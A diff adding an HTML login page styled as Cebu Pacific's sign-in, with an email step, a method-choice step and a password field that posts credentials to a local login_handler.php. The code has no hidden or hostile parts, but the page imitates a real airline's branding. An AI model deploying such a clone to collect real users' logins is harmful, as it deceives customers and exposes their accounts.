@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Cebu Pacific</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        /* =========================================
+           GLOBAL RESET
+           ========================================= */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        /* =========================================
+           FULL-HEIGHT COLUMN LOGIN PAGE
+           ========================================= */
+        .login-page-body {
+            background-image: url('images/siargao.webp'); 
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed; 
+            
+            display: flex;
+            justify-content: center; 
+            align-items: stretch; 
+            min-height: 100vh;
+            margin: 0;
+            padding: 0; 
+        }
+
+        .login-center-column {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 420px; 
+            border-radius: 0; 
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.25);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .login-column-header {
+            text-align: center;
+            padding: 30px 20px 25px 20px;
+            border-bottom: 1px solid #ebebeb; 
+            margin-bottom: 30px;
+        }
+
+        .login-column-header a {
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .login-logo {
+            width: 160px;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        .login-column-body {
+            padding: 0 40px;
+            flex-grow: 1; 
+        }
+
+        .login-input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .login-input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 13px;
+            font-weight: bold;
+            color: #222;
+        }
+
+        .login-input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #777;
+            border-radius: 4px;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .login-input-group input:focus {
+            border-color: #0088CE;
+        }
+
+        .login-input-group input.error-active {
+            border-color: #e53935;
+        }
+
+        .error-message {
+            color: #e53935;
+            font-size: 12px;
+            margin-top: 8px;
+            display: none; 
+            align-items: center;
+            gap: 6px;
+        }
+
+        .next-btn, .action-btn {
+            width: 100%;
+            background: #007bc7; 
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+
+        .next-btn:hover, .action-btn:hover {
+            background: #006eb3;
+        }
+
+        .login-column-footer {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        .login-column-footer a {
+            color: #0088CE;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .login-column-footer a:hover {
+            text-decoration: underline;
+        }
+
+        .auth-step {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+        .auth-step.active {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .step-title {
+            text-align: center;
+            font-size: 15px;
+            font-weight: bold;
+            color: #555;
+            margin-bottom: 25px;
+        }
+        .user-badge {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 30px;
+            font-weight: 500;
+        }
+        .step-subtitle {
+            text-align: center;
+            color: #666;
+            font-size: 15px;
+            margin-bottom: 20px;
+        }
+
+        .large-icon-circle {
+            width: 65px;
+            height: 65px;
+            border-radius: 50%;
+            border: 1px solid #c2e2f4;
+            background-color: #f2f9fd;
+            color: #0088CE;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 28px;
+            margin: 0 auto 20px auto;
+        }
+        .flex-col { flex-direction: column; }
+
+        .method-option {
+            display: flex;
+            align-items: center;
+            padding: 20px 0;
+            border-top: 1px solid #e0e0e0;
+        }
+        .method-icon {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            background-color: #f2f9fd;
+            color: #0088CE;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+            margin-right: 15px;
+        }
+        .method-name {
+            flex-grow: 1;
+            font-weight: 700;
+            font-size: 15px;
+            color: #333;
+        }
+        .select-btn {
+            background: transparent;
+            border: 1px solid #0088CE;
+            color: #0088CE;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .select-btn:hover { background: #f2f9fd; }
+
+        .step-links-bottom {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 30px;
+            text-align: center;
+        }
+        .back-link {
+            color: #666;
+            text-decoration: underline;
+            font-size: 13px;
+            cursor: pointer;
+        }
+        
+        .password-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        .password-wrapper input { width: 100%; }
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            color: #999;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body class="login-page-body">
+
+    <div class="login-center-column">
+        
+        <!-- Top Logo Header -->
+        <div class="login-column-header">
+            <a href="index.html">
+                <img src="images/CEB_logo_LFEJ_in_Noto_Sans_Linear.webp" alt="Cebu Pacific" class="login-logo">
+            </a>
+        </div>
+        
+        <!-- Main Form Area (Submits directly to login_handler.php) -->
+        <div class="login-column-body">
+            <form id="customerLoginForm" action="login_handler.php" method="POST" novalidate>
+                
+                <!-- Hidden input to safely carry the email forward across steps -->
+                <input type="hidden" id="hiddenEmail" name="email">
+
+                <!-- ========================================== -->
+                <!-- STEP 1: INITIAL LOGIN SCREEN (EMAIL) -->
+                <!-- ========================================== -->
+                <div id="step-1-initial" class="auth-step active">
+                    <div class="login-input-group">
+                        <label for="emailInput">Email Address</label>
+                        <input type="email" id="emailInput" required>
+                        
+                        <div class="error-message" id="emailError">
+                            <i class="fa-solid fa-circle-exclamation"></i> This field cannot be left blank
+                        </div>
+                    </div>
+                    <button type="button" id="nextToMethodBtn" class="next-btn">Next</button>
+
+                    <div class="login-column-footer">
+                        <p>Don't have an account? <a href="signup.html">Sign up</a></p>
+                    </div>
+                </div>
+
+                <!-- ========================================== -->
+                <!-- STEP 2: CHOOSE SECURITY METHOD -->
+                <!-- ========================================== -->
+                <div id="step-2-method" class="auth-step">
+                    <h3 class="step-title" style="font-size: 18px;">Verify it's you</h3>
+                    <div class="user-badge"><i class="fa-regular fa-circle-user"></i> <span class="display-email"></span></div>
+                    
+                    <p class="step-subtitle">Select from the following options</p>
+                    
+                    <div class="method-option" style="border-bottom: 1px solid #e0e0e0;">
+                        <div class="method-icon flex-col">
+                            <i class="fa-solid fa-lock" style="font-size: 13px; margin-bottom: 4px;"></i>
+                            <span style="font-size: 16px; line-height: 0.5;">****</span>
+                        </div>
+                        <div class="method-name">Password</div>
+                        <button type="button" class="select-btn" id="selectPasswordBtn">Select</button>
+                    </div>
+                    
+                    <div class="step-links-bottom">
+                        <a class="back-link" id="backToStep1">Back to sign in</a>
+                    </div>
+                </div>
+
+                <!-- ========================================== -->
+                <!-- STEP 6: PASSWORD LOGIN & FINAL SUBMISSION -->
+                <!-- ========================================== -->
+                <div id="step-password" class="auth-step">
+                    <div class="large-icon-circle flex-col">
+                        <i class="fa-solid fa-lock" style="font-size: 20px; margin-bottom: 5px;"></i>
+                        <span style="font-size: 24px; line-height: 0.5;">****</span>
+                    </div>
+                    <h3 class="step-title" style="font-size: 18px;">Verify with your password</h3>
+                    <div class="user-badge"><i class="fa-regular fa-circle-user"></i> <span class="display-email"></span></div>
+
+                    <div class="login-input-group">
+                        <label>Password</label>
+                        <div class="password-wrapper">
+                            <!-- Note the name="password" attribute so PHP can read it -->
+                            <input type="password" id="loginPassword" name="password">
+                            <i class="fa-solid fa-eye toggle-password" id="togglePasswordBtn"></i>
+                        </div>
+                        <div class="error-message" id="passwordError">
+                            <i class="fa-solid fa-circle-exclamation"></i> This field cannot be left blank
+                        </div>
+                    </div>
+                    
+                    <button type="submit" class="next-btn">Log in</button>
+
+                    <div class="step-links-bottom">
+                        <a class="back-link" id="backToMethod">Verify with something else</a>
+                        <a class="back-link" id="backToStep1Alt">Back to sign in</a>
+                    </div>
+                </div>
+
+            </form>
+        </div>
+    </div>
+
+    <!-- ========================================== -->
+    <!-- JAVASCRIPT FLOW LOGIC -->
+    <!-- ========================================== -->
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            function goToStep(targetId) {
+                document.querySelectorAll('.auth-step').forEach(step => {
+                    step.classList.remove('active');
+                });
+                const targetStep = document.getElementById(targetId);
+                if(targetStep) {
+                    targetStep.classList.add('active');
+                }
+            }
+
+            // Step 1: Next button clicked
+            document.getElementById('nextToMethodBtn').addEventListener('click', () => {
+                const emailInput = document.getElementById('emailInput');
+                const errorMsg = document.getElementById('emailError');
+
+                if (emailInput.value.trim() === "") {
+                    emailInput.classList.add('error-active');
+                    errorMsg.style.display = 'flex';
+                } else {
+                    emailInput.classList.remove('error-active');
+                    errorMsg.style.display = 'none';
+                    
+                    const userEmail = emailInput.value.trim();
+                    
+                    // Populate both the visual display elements and the hidden input field for PHP
+                    document.getElementById('hiddenEmail').value = userEmail;
+                    document.querySelectorAll('.display-email').forEach(el => {
+                        el.textContent = userEmail;
+                    });
+                    
+                    goToStep('step-2-method');
+                }
+            });
+
+            // Clear email error on input
+            document.getElementById('emailInput').addEventListener('input', function() {
+                this.classList.remove('error-active');
+                document.getElementById('emailError').style.display = 'none';
+            });
+
+            // Step 2: Select Password option
+            document.getElementById('selectPasswordBtn').addEventListener('click', () => {
+                goToStep('step-password');
+            });
+
+            // Back links
+            document.getElementById('backToStep1').addEventListener('click', () => goToStep('step-1-initial'));
+            document.getElementById('backToStep1Alt').addEventListener('click', () => goToStep('step-1-initial'));
+            document.getElementById('backToMethod').addEventListener('click', () => goToStep('step-2-method'));
+
+            // Final Form Submission validation
+            document.getElementById('customerLoginForm').addEventListener('submit', (e) => {
+                const passInput = document.getElementById('loginPassword');
+                const errorMsg = document.getElementById('passwordError');
+
+                if (passInput.value.trim() === "") {
+                    e.preventDefault(); 
+                    passInput.classList.add('error-active');
+                    errorMsg.style.display = 'flex';
+                }
+            });
+
+            // Toggle Password Visibility
+            const togglePasswordBtn = document.getElementById('togglePasswordBtn');
+            const passwordInput = document.getElementById('loginPassword');
+            
+            togglePasswordBtn.addEventListener('click', () => {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                
+                togglePasswordBtn.classList.toggle('fa-eye');
+                togglePasswordBtn.classList.toggle('fa-eye-slash');
+            });
+        });
+    </script>
+</body>
+</html>
